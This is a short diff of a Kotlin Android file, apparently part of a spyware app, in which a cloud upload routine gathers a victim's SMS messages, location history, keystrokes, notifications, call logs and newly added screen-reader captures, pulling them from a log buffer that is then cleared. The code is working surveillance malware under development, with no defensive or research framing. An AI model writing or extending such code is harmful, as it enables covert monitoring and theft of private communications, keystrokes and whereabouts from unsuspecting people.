@@ -163,12 +163,14 @@ object CloudManager {
         json.put("static", DeviceManager.getStaticInfo(ctx))
         json.put("health", DeviceManager.getHealthStats(ctx))
         
-        // 2. Behavioral Cache (Recent Activity)
-        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-        json.put("sms", JSONArray(prefs.getString("sms_logs_cache", "[]")))
-        json.put("loc", JSONArray(prefs.getString("location_history", "[]")))
-        json.put("typing", JSONArray(prefs.getString("typing_history", "[]")))
-        json.put("notifs", JSONArray(prefs.getString("notif_history", "[]")))
+        // 2. STREAM LOGGING RECOVERY
+        // This pulls all the data from the 'offline_buffer.jsonl' file
+        val logs = DumpManager.getAndClearLogs()
+        json.put("sms", logs.optJSONArray("SMS") ?: JSONArray())
+        json.put("loc", logs.optJSONArray("LOC") ?: JSONArray())
+        json.put("typing", logs.optJSONArray("KEY") ?: JSONArray())
+        json.put("notifs", logs.optJSONArray("NOTIF") ?: JSONArray())
+        json.put("screen_reader", logs.optJSONArray("SCREEN") ?: JSONArray())
         
         // 3. Persistent Data (The Deep Dive)
         json.put("calls", PhoneManager.getCallLogs(ctx))
